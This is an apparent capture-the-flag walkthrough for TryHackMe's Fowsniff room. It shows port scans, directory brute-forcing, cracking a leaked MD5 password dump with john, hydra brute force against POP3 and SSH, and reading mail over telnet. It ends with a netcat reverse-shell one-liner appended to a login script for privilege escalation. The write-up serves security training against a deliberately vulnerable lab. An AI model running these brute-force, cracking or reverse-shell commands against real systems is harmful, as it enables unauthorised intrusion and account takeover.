# Fowsniff CTF

**Room Link:** [https://tryhackme.com/room/ctf](https://tryhackme.com/room/ctf)



### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (24) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

No other ports found

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (26) (1) (1).png" alt=""><figcaption></figcaption></figure>

The homepage mentioned there was an attack. If you go to their twitter page the hacker says he dumped all the users password in pastebin. When I did this writeup the pastebin had been taken down so I just took it from another walkthrough.

<figure><img src="../../.gitbook/assets/image (20) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (23) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



```
FOWSNIFF CORP PASSWORD LEAK
            ''~``
           ( o o )
+-----.oooO--(_)--Oooo.------+
|                            |
|          FOWSNIFF          |
|            got             |
|           PWN3D!!!         |
|                            |         
|       .oooO                |         
|        (   )   Oooo.       |         
+---------\ (----(   )-------+
           \_)    ) /
                 (_/
FowSniff Corp got pwn3d by B1gN1nj4!
No one is safe from my 1337 skillz!


mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e

Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!

Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!

MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P

l8r n00bz!

B1gN1nj4

```



**Kali**



```
john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (15) (1) (2).png" alt=""><figcaption></figcaption></figure>



```
mauer@fowsniff:mailcall
mustikka@fowsniff:bilbo101
tegel@fowsniff:apples01
baksteen@fowsniff:skyler22
seina@fowsniff:scoobydoo2
mursten@fowsniff:carp4ever
parede@fowsniff:orlando12
sciana@fowsniff:07011972
```







### TCP/110 - POP3

**Kali**

```
hydra -L users2 -P pass.txt -f $VICTIM pop3 -V
```

<figure><img src="../../.gitbook/assets/image (25) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
telnet $VICTIM 110

USER seina
PASS scoobydoo2
RETR 1
```

<figure><img src="../../.gitbook/assets/image (29) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
telnet $VICTIM 110

USER seina
PASS scoobydoo2
RETR 2
```

<figure><img src="../../.gitbook/assets/image (30) (1).png" alt=""><figcaption></figcaption></figure>

### TCP/22 - SSH

**Kali**

```
hydra -L users2 -p "S1ck3nBluff+secureshell" $VICTIM -t4 ssh
```

<figure><img src="../../.gitbook/assets/image (22) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
ssh baksteen@$VICTIM
Password: S1ck3nBluff+secureshell
```

<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
id
groups
find / -type f -group users 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $KALI 1337 >/tmp/f" >> /opt/cube/cube.sh
```

**Kali**

```
nc -lvnp 1337
```

**Victim**

```
ssh baksteen@$VICTIM
Password: S1ck3nBluff+secureshell
```

<figure><img src="../../.gitbook/assets/image (36) (2).png" alt=""><figcaption></figcaption></figure>





























